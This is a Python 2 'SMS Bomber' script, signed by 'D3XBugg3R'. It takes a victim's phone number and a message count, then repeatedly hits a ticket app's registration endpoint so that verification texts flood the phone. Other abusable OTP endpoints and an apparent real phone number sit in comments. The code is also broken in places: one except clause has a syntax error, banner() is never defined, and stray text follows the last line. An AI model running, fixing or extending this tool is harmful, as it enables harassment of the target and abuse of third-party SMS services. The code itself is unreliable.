#python2
#from urllib.request import Request,urlopen
import urllib2,cookielib
#from urllib.parse import urlencode
import platform
import os
import time

try:
    raw_input
except NameErroR 
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    print("""
  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/
                                                                                                                                                                                                    
                                   By : D3XBugg3R                                                                                                 
    Note : I won't be responsible for any damage caused by this script, Use at your own risk
""")

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=

#http://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile=

#https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=
def send(num, counter, slep):
    #url = ["https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=","https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile=","https://t.justdial.com/api/india_api_write/10aug2016/sendvcode.php?mobile="]
    url="https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
    #data={"phone":num}
    hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3','Accept-Encoding': 'none','Accept-Language': 'en-US,en;q=0.8','Connection': 'keep-alive'}
    result_url=url+num
    req = urllib2.Request(result_url, headers=hdr)
    for x in range(counter):
        banner()
        #print("Target Number          : 01531999473", num)
        #print("Number of Message Sent : ", x+1)
        page = urllib2.urlopen(req)
        #resp1=Request(result_url)
        #urlopen(resp1)
        time.sleep(slep)
try:
    banner()
    number = raw_input("Enter mobileNumber: ")
    count = raw_input("Enter number of Message: ")
    throttle = raw_input("Enter time of sleep: ")
    send(number,int(count), int(throttle))
except Exception as e:
    print("Something is wrong please Re-run this script.")                       
    BY ANSIL
    
   
